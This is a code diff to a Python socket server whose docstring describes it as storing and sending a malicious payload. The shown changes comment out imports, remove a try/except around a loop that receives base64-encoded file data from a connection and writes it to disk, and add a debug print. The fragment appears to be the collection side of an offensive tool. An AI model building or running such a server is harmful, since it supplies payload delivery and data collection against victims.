@@ -12,8 +12,8 @@ import subprocess
 import errno
 import time
 from getmac import get_mac_address
-from io import BytesIO
-import rsa
+#from io import BytesIO
+#import rsa
 
 class Server:
     """ This class represents a server that stores some malicious payload and sends
@@ -90,24 +90,25 @@ class Server:
         
         file_loc = os.path.join(path, filename)
         print("[RECV] Receiving the filename.")
-        try:
-            file = open(file_loc, "w")
-            conn.sendall(base64.b64encode("Filename received.".encode(Server.FORMAT)))
-            while "FILEDONE" not in data_file :
-                data_file = base64.b64decode(conn.recv(Server.MAX_SIZE)).decode(Server.FORMAT, errors="ignore")
-                print("[RECV] Receiving the file data.")
-                file.write(data_file)
-                conn.sendall(base64.b64encode("File data received.".encode(Server.FORMAT)))
-                size+=len(data_file)
-                print("size: "+str(size))
+        #try:
+        file = open(file_loc, "w")
+        conn.sendall(base64.b64encode("Filename received.".encode(Server.FORMAT)))
+        while "FILEDONE" not in data_file :
+            data_file = base64.b64decode(conn.recv(Server.MAX_SIZE)).decode(Server.FORMAT, errors="ignore")
+            print("[RECV] Receiving the file data.")
+            file.write(data_file)
+            conn.sendall(base64.b64encode("File data received.".encode(Server.FORMAT)))
+            size+=len(data_file)
+            print("size: "+str(size))
 
-        except ValueError:
+        #except ValueError:
             #with BytesIO(filename) as f:
             #    file = open(str(f.name).split(chr(92))[-1], "w")
             #    print(str(f.name).split(chr(92))[-1])
             #    file.write(f.read())
-            return
+        #    return
 
+        print("file data: "+data_file)
         conn.sendall(base64.b64encode("FILEDONE RECEIVED".encode(Server.FORMAT)))
 
         file.close() 
